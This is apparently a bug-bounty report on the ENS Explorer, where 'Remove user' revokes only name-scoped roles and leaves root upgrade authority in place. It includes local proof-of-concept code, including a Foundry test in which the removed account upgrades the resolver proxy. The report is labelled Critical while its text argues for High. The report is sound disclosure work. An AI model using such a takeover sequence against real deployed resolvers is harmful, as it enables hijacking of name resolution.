# 92545 w a critical removing a resolver user leaves root upgrade authority intact

**Submitted on Sep 10th 2026 at 15:33:33 UTC by @PlasticGinnie98802 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92545
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer groups PermissionedResolver roles by account even though the contract stores those roles under separate resources. If the same account has a root role and a name-scoped role, Explorer shows one row with one combined role list.

When the resolver administrator clicks **Remove user**, the confirmation says that the user will be removed from all roles. Explorer instead picks the first non-root name and submits one name-scoped revocation containing the combined role bitmap. That transaction succeeds, but it cannot touch the root resource. In the reproduced case, the account lost its name-scoped ROLE\_SET\_ADDR permission while root ROLE\_UPGRADE remained active. The supposedly removed account then upgraded the entire PermissionedResolver proxy.

I am reporting this as High rather than Critical because the attacker already held resolver authority before the administrator tried to remove it. The bug is a failed revocation: the normal cleanup flow reports success while leaving the strongest root permission active.

## Vulnerability Details

### 1. Explorer discards the resource boundary while grouping roles

Affected file:

* apps/portal/src/lib/roles/resolverRoles.ts:179-222

"groupRolesByAccount" uses only the lowercase account address as the map key. When another role row has the same account, it appends the role and decoded bitmap to the existing group:

```ts
const account = role.account.toLowerCase()
const existing = grouped.get(account)

if (existing) {
  existing.roles.push(role)
  existing.decodedRoles.push(...decoded)
  if (resolvedName) existing.resolvedNames.add(resolvedName)
}
```

The resulting row may represent root, name, and record-part resources at the same time. The original resource-to-bitmap relationship is no longer available to the edit and removal flow.

### 2. Remove user reduces the combined row to one name scope

Affected file:

* apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:164-170, 247-271, 307-324, 444-462

The sidebar takes every decoded role from the combined row, but chooses only the first non-root name:

```ts
const decodedRoles = row?.original.decodedRoles ?? []
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

For the Remove user action, it stores that one name together with the full combined role array:

```ts
setPendingAction({
  type: 'remove',
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
})
```

The user sees this confirmation:

> Are you sure you want to remove this user from all roles? This action cannot be undone.

### 3. The helper emits a name-only revocation

Affected files:

* apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:29-66
* apps/portal/node\_modules/@ensdomains/ensjs/src/actions/wallet/v2/revokeResolverRoles.ts:97-134

Because "roleName" is non-empty, "prepareRevokeResolverRolesTransaction" selects the name scope. ENSjs encodes:

```solidity
authorizeNameRoles(name, combinedRoleBitmap, account, false)
```

It does not call "revokeRootRoles". The combined bitmap does not help because the call still writes only to the name resource. The transaction succeeds, so the product has no failure signal. There is also no post-receipt check that confirms the account has zero roles on every resource represented by the row.

## Impact Details

An account that the administrator believes they removed can retain root upgrade authority. ROLE\_UPGRADE authorizes UUPS upgrades for the resolver proxy, so the account can replace the resolver implementation after the cleanup transaction succeeds.

The attached step-by-step PoC uses the exact PR #409 PermissionedResolver implementation. After the Explorer-shaped revocation, the removed account calls "upgradeToAndCall" successfully. The replacement implementation changes "addr(testNode)" to "address(1)". This proves control of resolver behavior, not only a stale UI row.

A malicious implementation can return attacker-controlled addresses or change other resolution behavior for names using the resolver. The administrator has already completed Explorer's explicit remove-from-all-roles workflow at that point.

### Preconditions

The attacker-controlled account must already have:

1. at least one root role, such as ROLE\_UPGRADE; and
2. at least one name-scoped role on the same resolver.

The resolver administrator then uses the ordinary Explorer Remove user action. The attacker does not need the administrator's private key, a malicious RPC, a browser bug, modified Explorer source, or modified resolver bytecode.

## Affected target

* Asset: Explorer app Files, apps/portal
* Audited revision: 63772fd872af472ced58b009499355f3430c2a86

The three relevant Explorer files at the audited revision are byte-identical to the files used by the local PoC:

* resolverRoles.ts: 45e347ba9300ec3605b4bebdd7ded7e265a828a39fd18e87d5c763cd781faab7
* ResolverRolesSidebar.tsx: ac954b1790e50f45068852e55c5bac6ba61d6dedd30c2e84f29ea925642b825a
* revokeResolverRoles.ts: 01a59e8853972fceb876bc573d8b1ff91fb693622c2975b9f6e667fbbc41f771

## Why this is not a listed known issue

QA-01 describes follow-up errors after name transfers with some role combinations. WEB-1305 describes V1 role transfer hanging. This report needs no name transfer, and the removal transaction neither hangs nor reverts. It succeeds while root authority remains active.

The known-issues document also states that a demonstrated security consequence of a role combination, rather than ordinary breakage, is a new finding. The demonstrated consequence here is a successful resolver proxy takeover after the administrator completes the advertised cleanup action.

## Recommended fix

Do not aggregate editable permissions by account alone. Keep the resource identity attached to each role bitmap.

For an action called Remove user from all roles, build one revocation for every original resource represented by the account, preferably in one multicall. Root permissions must use "revokeRootRoles". Name and record-part permissions must use their matching scoped functions.

The confirmation should list the resources that will be changed. After the receipt, query every affected resource and treat the operation as failed if any represented permission remains.

## References

* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/lib/roles/resolverRoles.ts>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts>

## Proof of Concept

## Proof of Concept

This PoC has two parts. The first executes the audited Explorer grouping code and the exact ENSjs transaction builder. The second applies the resulting state transition to the exact PR #409 PermissionedResolver and proves that the surviving root role can upgrade the proxy.

No public RPC, real wallet, production name, or production contract is used.

## Part 1: Explorer boundary

### Step 1

Check out audited revision 63772fd872af472ced58b009499355f3430c2a86 and install the pinned dependencies.

### Step 2

Create "portal-role-collapse.poc.ts" at the repository root with the following contents:

```ts
import assert from 'node:assert/strict'
import { pathToFileURL } from 'node:url'
import { resolve } from 'node:path'

const fromRepo = (path: string) =>
  pathToFileURL(resolve(process.cwd(), path)).href

const { createWalletClient, custom, decodeFunctionData, encodeFunctionData } =
  await import(fromRepo('apps/portal/node_modules/viem/_esm/index.js'))
const { sepolia } = await import(
  fromRepo('apps/portal/node_modules/viem/_esm/chains/index.js'),
)
const { revokeResolverRolesWriteParameters } = await import(
  fromRepo(
    'apps/portal/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/revokeResolverRoles.ts',
  ),
)
const {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} = await import(fromRepo('apps/portal/src/lib/roles/resolverRoles.ts'))

const ROOT_RESOURCE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'
const ADMIN = '0x1000000000000000000000000000000000000001'
const TARGET = '0x2000000000000000000000000000000000000002'
const RESOLVER = '0x3000000000000000000000000000000000000003'
const name = 'scope-collapse.eth'

const grouped = groupRolesByAccount(
  [
    {
      account: TARGET,
      resource: ROOT_RESOURCE,
      roleBitmap: resolverRoles.ROLE_UPGRADE.toString(),
    },
    {
      account: TARGET,
      resource: computeNameResource(name),
      roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
    },
  ],
  buildResourceToNameMap([{ name }]),
)

assert.equal(grouped.length, 1)
assert.deepEqual(grouped[0].resolvedNames, ['(root)', name])
assert.deepEqual(grouped[0].decodedRoles, ['ROLE_UPGRADE', 'ROLE_SET_ADDR'])

// Exact expression used by ResolverRolesSidebar.tsx.
const roleName =
  grouped[0].resolvedNames.find((value) => value !== '(root)') ?? ''
assert.equal(roleName, name)

const walletClient = createWalletClient({
  account: ADMIN,
  chain: sepolia,
  transport: custom({
    request: async () => {
      throw new Error('No RPC is expected')
    },
  }),
})

const writeParams = revokeResolverRolesWriteParameters(walletClient, {
  resolverAddress: RESOLVER,
  targetAccount: TARGET,
  scope: 'name',
  name: roleName,
  roles: grouped[0].decodedRoles,
})
const data = encodeFunctionData({
  abi: writeParams.abi,
  functionName: writeParams.functionName,
  args: writeParams.args,
})
const decoded = decodeFunctionData({ abi: writeParams.abi, data })

assert.equal(decoded.functionName, 'authorizeNameRoles')
assert.equal(
  decoded.args?.[1],
  resolverRoles.ROLE_UPGRADE | resolverRoles.ROLE_SET_ADDR,
)
assert.equal(decoded.args?.[2], TARGET)
assert.equal(decoded.args?.[3], false)

console.log('PASS: one UI row combined root ROLE_UPGRADE with name ROLE_SET_ADDR')
console.log('PASS: Remove user encoded authorizeNameRoles for scope-collapse.eth')
console.log('PASS: the bitmap contains both roles but targets only the name resource')
```

### Step 3

Run:

```bash
bun portal-role-collapse.poc.ts
```

Expected output:

```
PASS: one UI row combined root ROLE_UPGRADE with name ROLE_SET_ADDR
PASS: Remove user encoded authorizeNameRoles for scope-collapse.eth
PASS: the bitmap contains both roles but targets only the name resource
```

The decoded transaction function is "authorizeNameRoles". Its bitmap contains ROLE\_UPGRADE and ROLE\_SET\_ADDR, but its resource argument is only "scope-collapse.eth".

## Part 2: Resolver impact

Use the ENS contracts-v2 PR #409 checkout referenced by the competition resources.

### Step 4

Create "test/unit/resolver/PortalRoleResourceCollapse.t.sol" beside "PermissionedResolver.t.sol":

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {PermissionedResolverTest, MockUpgrade} from "./PermissionedResolver.t.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";

contract PortalRoleResourceCollapseTest is PermissionedResolverTest {
    function test_nameScopedUnionRevokeLeavesRootUpgradeAndPermitsTakeover()
        external
    {
        uint256 rootRole = PermissionedResolverLib.ROLE_UPGRADE;
        uint256 nameRole = PermissionedResolverLib.ROLE_SET_ADDR;
        uint256 nameResource = PermissionedResolverLib.resource(testNode, 0);

        vm.startPrank(owner);
        resolver.grantRootRoles(rootRole, friend);
        resolver.authorizeNameRoles(testName, nameRole, friend, true);
        vm.stopPrank();

        assertTrue(
            resolver.hasRootRoles(rootRole, friend),
            "root role before UI removal"
        );
        assertTrue(
            resolver.hasRoles(nameResource, nameRole, friend),
            "name role before UI removal"
        );

        // Exact state transition selected by Explorer.
        vm.prank(owner);
        assertTrue(
            resolver.authorizeNameRoles(
                testName,
                rootRole | nameRole,
                friend,
                false
            ),
            "Explorer removal transaction succeeds"
        );

        assertFalse(
            resolver.hasRoles(nameResource, nameRole, friend),
            "name role removed"
        );
        assertTrue(
            resolver.hasRootRoles(rootRole, friend),
            "root upgrade role survives"
        );

        MockUpgrade takeover = new MockUpgrade();
        vm.prank(friend);
        resolver.upgradeToAndCall(address(takeover), "");
        assertEq(
            resolver.addr(testNode),
            address(1),
            "surviving role upgrades resolver"
        );
    }
}
```

### Step 5

Run:

```bash
forge test \
  --match-contract PortalRoleResourceCollapseTest \
  --match-test test_nameScopedUnionRevokeLeavesRootUpgradeAndPermitsTakeover \
  -vv
```

Expected output:

```
[PASS] test_nameScopedUnionRevokeLeavesRootUpgradeAndPermitsTakeover()
```

The assertions prove that:

1. the account starts with root ROLE\_UPGRADE and name ROLE\_SET\_ADDR;
2. the Explorer-shaped name-scoped union revocation succeeds;
3. the name permission is removed;
4. root ROLE\_UPGRADE remains active;
5. the removed account upgrades the proxy; and
6. the replacement implementation changes the resolver's address response.

Both parts passed twice with unchanged fixtures and assertions. The application boundary and contract transition are composed local tests rather than one browser connected to the Foundry process. This is the main limitation I am retaining in the report.
